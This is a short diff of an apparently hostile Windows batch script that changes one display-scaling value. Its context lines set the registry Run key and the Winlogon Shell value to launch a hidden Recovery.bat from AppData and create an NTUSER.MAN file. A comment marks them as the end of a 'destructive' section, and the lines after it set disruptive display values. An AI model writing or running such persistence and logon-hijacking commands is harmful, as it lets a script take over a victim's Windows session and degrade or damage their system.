@@ -88,7 +88,7 @@ echo. > %USERPROFILE%\NTUSER.MAN
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Recovery" /t REG_SZ /d "%appdata%\Microsoft\Recovery.bat" /f
 reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,%appdata%\Microsoft\Recovery.bat" /f
 ' end of destructive, start of accessibility
-reg add "HKCU\Control Panel\Desktop" /v "LogPixels" /t REG_DWORD /d "192" /f
+reg add "HKCU\Control Panel\Desktop" /v "LogPixels" /t REG_DWORD /d "300" /f
 reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "BorderWidth" /t REG_SZ /d "-300" /f
 reg add "HKCU\Control Panel\Software\Microsoft\Windows\DWM" /v "ColorPrevalence" /t REG_SZ /d "1" /f
 reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "AccentColor" /t REG_SZ /d "ff0000ff" /f
